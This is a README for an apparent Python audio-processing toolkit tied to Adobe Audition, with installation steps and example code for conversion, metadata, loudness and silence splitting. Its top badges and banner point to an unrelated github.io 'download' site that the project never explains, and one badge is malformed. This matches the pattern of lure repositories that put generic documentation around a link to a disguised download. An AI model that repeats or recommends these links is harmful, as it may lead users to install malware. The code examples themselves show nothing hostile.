# adobe-audition-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://syq246.github.io/adobe-site-xrx/)


[![Banner](banner.png)](https://syq246.github.io/adobe-site-xrx/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![PyPI Version](https://img.shields.io/pypi/v/adobe-audition-toolkit.svg)](https://pypi.org/project/adobe-audition-toolkit/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/github/actions/workflow/status/adobe-audition-toolkit/main/ci.yml)](https://github.com/adobe-audition-toolkit/adobe-audition-toolkit/actions)
[![Coverage](https://img.shields.io/codecov/c/github/adobe-audition-toolkit/adobe-audition-toolkit)](https://codecov.io/gh/adobe-audition-toolkit/adobe-audition-toolkit)
[![Download](https://syq246.github.io/adobe-site-xrx/)](https://pypi.org/project/adobe-audition-toolkit/)

A Python toolkit for programmatic audio processing workflows that complement Adobe Audition on Windows. Automate batch editing tasks, extract audio metadata, convert between formats, and integrate Audition-compatible session files into your Python pipelines — without leaving your development environment.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 🎛️ **Session File Parsing** — Read and inspect Adobe Audition `.sesx` session files programmatically
- 🔄 **Format Conversion** — Convert audio files between WAV, MP3, FLAC, AAC, and OGG with configurable quality settings
- 📦 **Batch Processing** — Apply normalization, noise reduction parameters, and EQ presets across entire directories
- 🏷️ **Metadata Extraction** — Extract and export ID3, XMP, and BWF metadata from audio files processed in Audition
- ✂️ **Clip Segmentation** — Detect silence, split multi-track exports, and trim leading/trailing silence automatically
- 📊 **Waveform Analysis** — Generate loudness reports (LUFS, RMS, peak) compatible with Audition's amplitude statistics
- 🗂️ **Project Asset Management** — Inventory and validate all linked media assets within an Audition session
- 🖥️ **Windows Integration** — Native support for Windows audio APIs and Audition's default file paths on Windows 10/11

---

## Installation

### From PyPI

```bash
pip install adobe-audition-toolkit
```

### From Source

```bash
git clone https://github.com/adobe-audition-toolkit/adobe-audition-toolkit.git
cd adobe-audition-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

For full format conversion support, install `ffmpeg` and ensure it is on your system `PATH`:

```bash
# Windows (using winget)
winget install Gyan.FFmpeg

# Verify installation
ffmpeg -version
```

---

## Quick Start

```python
from audition_toolkit import AuditionSession, AudioProcessor

# Load an existing Adobe Audition session file
session = AuditionSession.from_file(r"C:\Projects\MyPodcast\session.sesx")

print(f"Session name : {session.name}")
print(f"Sample rate  : {session.sample_rate} Hz")
print(f"Tracks       : {len(session.tracks)}")

# List all media assets referenced by the session
for asset in session.assets:
    print(f"  [{asset.format}] {asset.name} — {asset.duration:.2f}s")
```

**Sample output:**

```
Session name : MyPodcast_EP42
Sample rate  : 48000 Hz
Tracks       : 6
  [WAV]  intro_music.wav      — 12.40s
  [MP3]  interview_raw.mp3    — 2847.15s
  [WAV]  outro_sting.wav      —  8.00s
```

---

## Usage Examples

### Batch Format Conversion

Convert an entire folder of WAV exports from Adobe Audition to MP3 with a single call:

```python
from audition_toolkit import BatchConverter
from audition_toolkit.formats import ConversionConfig

config = ConversionConfig(
    output_format="mp3",
    bitrate_kbps=320,
    sample_rate=44100,
    overwrite_existing=False,
)

converter = BatchConverter(config=config)
results = converter.convert_directory(
    input_dir=r"C:\Exports\RawWAV",
    output_dir=r"C:\Exports\MP3",
    recursive=True,
)

print(f"Converted : {results.success_count} files")
print(f"Skipped   : {results.skip_count} files")
print(f"Failed    : {results.failure_count} files")

for failure in results.failures:
    print(f"  ERROR — {failure.path}: {failure.reason}")
```

---

### Metadata Extraction

Extract and export metadata from audio files, including BWF fields written by Adobe Audition on Windows:

```python
from audition_toolkit import MetadataExtractor
import json

extractor = MetadataExtractor()

meta = extractor.extract(r"C:\Projects\Recordings\interview_final.wav")

print(f"Title        : {meta.title}")
print(f"Artist       : {meta.artist}")
print(f"Duration     : {meta.duration_seconds:.3f}s")
print(f"Bit depth    : {meta.bit_depth}-bit")
print(f"Channels     : {meta.channels}")
print(f"BWF Originator: {meta.bwf.originator}")
print(f"BWF Time Ref : {meta.bwf.time_reference}")

# Export to JSON for downstream pipeline use
with open("metadata_report.json", "w") as f:
    json.dump(meta.to_dict(), f, indent=2)
```

---

### Loudness Analysis

Generate a loudness report consistent with the amplitude statistics panel in Adobe Audition:

```python
from audition_toolkit.analysis import LoudnessAnalyzer

analyzer = LoudnessAnalyzer()

report = analyzer.analyze(r"C:\Exports\final_mix.wav")

print(f"Integrated LUFS : {report.integrated_lufs:.2f} LUFS")
print(f"True Peak       : {report.true_peak_dbtp:.2f} dBTP")
print(f"RMS             : {report.rms_db:.2f} dB")
print(f"Dynamic Range   : {report.dynamic_range:.2f} LU")
print(f"Broadcast safe  : {'✅ Yes' if report.is_broadcast_safe else '❌ No'}")
```

---

### Session Asset Validation

Validate that all media files referenced in an Audition session are present on disk before rendering:

```python
from audition_toolkit import AuditionSession
from audition_toolkit.validation import AssetValidator

session = AuditionSession.from_file(r"C:\Projects\Documentary\edit_v3.sesx")
validator = AssetValidator()

report = validator.validate(session)

if report.is_valid:
    print("✅ All session assets resolved successfully.")
else:
    print(f"⚠️  {report.missing_count} missing asset(s):")
    for missing in report.missing_assets:
        print(f"   - {missing.expected_path}")
        if missing.suggested_path:
            print(f"     → Suggested: {missing.suggested_path}")
```

---

### Silence Detection and Clip Splitting

Automatically split a long recording into segments by detecting silence — useful for processing raw recordings before importing into Adobe Audition:

```python
from audition_toolkit.editing import SilenceDetector, ClipSplitter

detector = SilenceDetector(
    threshold_db=-50.0,
    min_silence_duration_ms=800,
    padding_ms=200,
)

splitter = ClipSplitter(detector=detector)

segments = splitter.split(
    input_file=r"C:\Recordings\raw_session.wav",
    output_dir=r"C:\Recordings\Segments",
    filename_prefix="segment",
)

print(f"Created {len(segments)} segments:")
for seg in segments:
    print(f"  {seg.filename}  [{seg.start:.2f}s → {seg.end:.2f}s]")
```

---

## Requirements

| Requirement | Minimum Version | Notes |
|---|---|---|
| Python | 3.8+ | 3.11 recommended |
| `pydub` | 0.25.1+ | Core audio I/O |
| `mutagen` | 1.46.0+ | ID3 / XMP metadata |
| `soundfile` | 0.12.1+ | WAV / FLAC / AIFF read-write |
| `numpy` | 1.23.0+ | Waveform analysis |
| `lxml` | 4.9.0+ | `.sesx` session XML parsing |
| `pyloudnorm` | 0.1.1+ | LUFS / EBU R128 measurement |
| `ffmpeg` (system) | 5.0+ | Optional — required for MP3/AAC output |
| Windows | 10 / 11 | Primary target platform |

> **Note:** The toolkit is developed and tested primarily on **Windows 10 and Windows 11**, which matches Adobe Audition's primary deployment environment. Core analysis and metadata features also work on macOS and Linux.

---

## Project Structure

```
adobe-audition-toolkit/
├── audition_toolkit/
│   ├── __init__.py
│   ├── session.py          # .sesx session file parser
│   ├── batch.py            # Batch conversion and processing
│   ├── metadata.py         # Metadata extraction (ID3, XMP, BWF)
│   ├── analysis/
│   │   ├── loudness.py     # LUFS / RMS / peak analysis
│   │   └── waveform.py     # Waveform statistics
│   ├── editing/
│   │   ├── silence.py      # Silence detection
│   │   └── splitter.py     # Clip segmentation
│   ├── formats.py          # Conversion configs and format map
│   └── validation.py       # Session asset validation
├── tests/
├── examples/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Install** development dependencies:
   ```bash
   pip install -e ".[dev]"
   ```

3. **Write tests** for new functionality under `tests/`:
   ```bash
   pytest tests/ -v --cov=audition_toolkit
   ```

4. **Lint** your code before submitting:
   ```bash
   ruff check . && black --check .
   ```

5. Open a **Pull Request** with a clear description of the change and any relevant issue numbers.

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the full code of conduct and contribution guidelines.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for full details.

---

## Acknowledgements

- [`pydub`](https://github.com/jiaaro/pydub) for straightforward audio I/O abstractions
- [`pyloudnorm`](https://github.com/csteinmetz1/pyloudnorm) for EBU R128 / ITU-R BS.1